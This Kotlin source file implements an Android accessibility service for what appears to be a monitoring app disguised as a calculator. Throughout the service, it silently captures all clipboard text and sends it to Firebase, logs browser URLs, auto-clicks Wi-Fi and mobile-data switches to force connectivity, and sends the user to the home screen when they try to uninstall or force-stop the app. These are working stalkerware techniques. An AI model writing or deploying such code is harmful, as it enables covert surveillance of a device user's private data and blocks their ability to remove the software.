package com.example.authapp.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.utils.WebHistoryManager
import com.google.firebase.crashlytics.FirebaseCrashlytics

class ChildAccessibilityService : AccessibilityService() {

    private var lastCapturedUrl = ""
    private var lastCapturedTime = 0L
    private var lastCopiedText = ""

    companion object {
        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.chrome.beta",
            "com.chrome.canary",
            "com.chrome.dev",
            "org.chromium.chrome",
            "com.brave.browser",
            "com.sec.android.app.sbrowser",
            "com.sec.android.app.sbrowser.beta",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.microsoft.emmx",
            "org.mozilla.firefox",
            "org.mozilla.firefox_beta",
            "org.mozilla.focus",
            "com.duckduckgo.mobile.android",
            "com.google.android.apps.searchlite",
            "com.google.android.googlequicksearchbox"
        )

        private val URL_BAR_VIEW_IDS = listOf(
            "com.android.chrome:id/url_bar",
            "com.chrome.beta:id/url_bar",
            "com.brave.browser:id/url_bar",
            "com.sec.android.app.sbrowser:id/location_bar_edit_text",
            "com.microsoft.emmx:id/url_bar",
            "org.mozilla.firefox:id/mozac_browser_toolbar_edit_url_view",
            "org.mozilla.firefox:id/toolbar",
            "com.opera.browser:id/url_field"
        )

        private val SYSTEM_PROTECTED_PACKAGES = setOf(
            "com.android.settings",
            "com.android.systemui",
            "com.sec.android.app.launcher",
            "com.google.android.apps.nexuslauncher",
            "com.android.launcher",
            "com.android.launcher3",
            "com.google.android.packageinstaller",
            "com.android.packageinstaller",
            "com.samsung.android.dialer",
            "com.google.android.dialer",
            "com.android.phone",
            "com.android.server.telecom",
            "com.google.android.gms",
            "com.android.vending"
        )

        var instance: ChildAccessibilityService? = null
            private set

        @Volatile
        var blockedPackageNames: Set<String> = emptySet()
    }

    fun returnToHomeScreen(): Boolean {
        return performGlobalAction(GLOBAL_ACTION_HOME)
    }

    @Volatile
    private var isAutoEnablingInternet = false
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())

    fun triggerAutoEnableInternet() {
        isAutoEnablingInternet = true
        FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] triggerAutoEnableInternet initiated")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            try {
                val panelIntent = android.content.Intent(android.provider.Settings.Panel.ACTION_INTERNET_CONNECTIVITY).apply {
                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(panelIntent)
            } catch (_: Exception) {
                performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
            }
        } else {
            performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
        }

        // Check active window after short delay
        mainHandler.postDelayed({
            tryAutoClickInternetSwitches()
        }, 500)

        // Reset safety flag after 5 seconds
        mainHandler.postDelayed({
            isAutoEnablingInternet = false
        }, 5000)
    }

    private fun tryAutoClickInternetSwitches() {
        if (!isAutoEnablingInternet) return
        try {
            val root = rootInActiveWindow ?: return
            val clicked = scanAndClickInternetToggle(root)
            if (clicked) {
                isAutoEnablingInternet = false
                FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Internet toggle clicked successfully")
                mainHandler.postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }, 700)
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] tryAutoClick error: ${e.localizedMessage}")
        }
    }

    private fun scanAndClickInternetToggle(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase() ?: ""
        val desc = node.contentDescription?.toString()?.lowercase() ?: ""
        val isTargetName = text.contains("wi-fi") || text.contains("wifi") || text.contains("mobile data") ||
                text.contains("cellular") || desc.contains("wi-fi") || desc.contains("wifi") ||
                desc.contains("mobile data") || desc.contains("turn on") || desc.contains("off")

        if (node.isClickable && (node.className == "android.widget.Switch" || isTargetName)) {
            val isChecked = node.isChecked
            if (!isChecked || isTargetName) {
                val success = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                if (success) {
                    FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Auto-clicked internet toggle: $text / $desc")
                    return true
                }
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (scanAndClickInternetToggle(child)) return true
        }
        return false
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                notificationTimeout = 100
            }
            serviceInfo = info
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Connected and configured")
            AppHealthTelemetry.syncDeviceHealth(applicationContext)

            // Setup real-time clipboard copy-paste monitoring
            try {
                val clipboard = getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                clipboard?.addPrimaryClipChangedListener {
                    try {
                        val clip = clipboard.primaryClip
                        if (clip != null && clip.itemCount > 0) {
                            val text = clip.getItemAt(0)?.text?.toString()?.trim() ?: ""
                            if (text.isNotEmpty() && text != lastCopiedText) {
                                lastCopiedText = text
                                val childId = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                                if (childId.isNotEmpty()) {
                                    FirebaseRepository.pushClipboardLog(childId, text)
                                    FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Captured clipboard text (len=${text.length})")
                                }
                            }
                        }
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Clipboard notice: ${e.localizedMessage}")
                    }
                }
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Clipboard init error: ${e.localizedMessage}")
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: return

        if (isAutoEnablingInternet) {
            tryAutoClickInternetSwitches()
        }

        // Anti-Uninstall Shield: If packageinstaller or settings attempts to uninstall Calculator, kick back to Home!
        if (packageName.contains("packageinstaller") || packageName == "com.android.settings") {
            try {
                val root = rootInActiveWindow ?: event.source
                if (root != null && isUninstallAttemptForOurApp(root)) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Uninstall attempt blocked and dismissed to Home")
                    return
                }
            } catch (_: Exception) {}
        }

        // Safety: Never intercept or block own Calculator app or vital System apps (Settings, Launcher, Dialer, etc.)!
        if (packageName == applicationContext.packageName || SYSTEM_PROTECTED_PACKAGES.contains(packageName)) return

        // 1. Blocked App Auto-Kickback: If child opens a blocked app, immediately return to Home Screen!
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && blockedPackageNames.isNotEmpty() && blockedPackageNames.contains(packageName)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Blocked app $packageName opened - intercepted and dismissed to Home")
            return
        }

        if (!BROWSER_PACKAGES.contains(packageName)) return

        try {
            val rootNode = rootInActiveWindow ?: event.source ?: return
            extractAndLogBrowserUrl(rootNode, packageName)
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Event parsing notice: ${e.localizedMessage}")
        }
    }

    private fun extractAndLogBrowserUrl(rootNode: AccessibilityNodeInfo, packageName: String) {
        var rawUrl: String? = null

        // 1. Try direct resource ID search
        for (viewId in URL_BAR_VIEW_IDS) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
            if (!nodes.isNullOrEmpty()) {
                val text = nodes[0].text?.toString()?.trim()
                if (!text.isNullOrEmpty() && isValidUrlCandidate(text)) {
                    rawUrl = text
                    break
                }
            }
        }

        // 2. Recursive fallback search for address bar EditText
        if (rawUrl == null) {
            rawUrl = findUrlRecursively(rootNode)
        }

        if (!rawUrl.isNullOrEmpty()) {
            val formattedUrl = formatUrl(rawUrl)
            val now = System.currentTimeMillis()

            // Deduplicate: same URL within 3 seconds ignored
            if (formattedUrl != lastCapturedUrl || (now - lastCapturedTime) > 3000L) {
                lastCapturedUrl = formattedUrl
                lastCapturedTime = now
                FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Captured Browser URL: $formattedUrl (pkg=$packageName)")
                WebHistoryManager.logVisitedUrl(applicationContext, formattedUrl, packageName)
            }
        }
    }

    private fun findUrlRecursively(node: AccessibilityNodeInfo): String? {
        if (node.className == "android.widget.EditText" || node.className == "android.widget.TextView") {
            val text = node.text?.toString()?.trim()
            if (!text.isNullOrEmpty() && isValidUrlCandidate(text)) {
                return text
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findUrlRecursively(child)
            if (found != null) return found
        }
        return null
    }

    private fun isValidUrlCandidate(text: String): Boolean {
        if (text.startsWith("http://") || text.startsWith("https://") || text.startsWith("www.")) {
            return true
        }
        return text.contains(".") && !text.contains(" ") && text.length > 3 &&
                (text.endsWith(".com") || text.endsWith(".org") || text.endsWith(".in") ||
                        text.endsWith(".net") || text.endsWith(".io") || text.endsWith(".co") ||
                        text.endsWith(".edu") || text.endsWith(".gov") || text.endsWith(".ai") ||
                        text.contains(".com/") || text.contains(".org/") || text.contains(".in/"))
    }

    private fun formatUrl(url: String): String {
        return if (!url.startsWith("http://") && !url.startsWith("https://")) {
            "https://$url"
        } else {
            url
        }
    }

    private fun isUninstallAttemptForOurApp(node: AccessibilityNodeInfo): Boolean {
        val allText = StringBuilder()
        collectAllText(node, allText)
        val textStr = allText.toString().lowercase()
        val hasUninstall = textStr.contains("uninstall") || textStr.contains("delete app") || textStr.contains("force stop")
        val isOurApp = textStr.contains("calculator") || textStr.contains("com.example.authapp")
        return hasUninstall && isOurApp
    }

    private fun collectAllText(node: AccessibilityNodeInfo, sb: StringBuilder) {
        node.text?.let { sb.append(it).append(" ") }
        node.contentDescription?.let { sb.append(it).append(" ") }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectAllText(child, sb)
        }
    }

    override fun onInterrupt() {
        FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Service interrupted")
    }

    override fun onDestroy() {
        if (instance == this) instance = null
        super.onDestroy()
    }
}
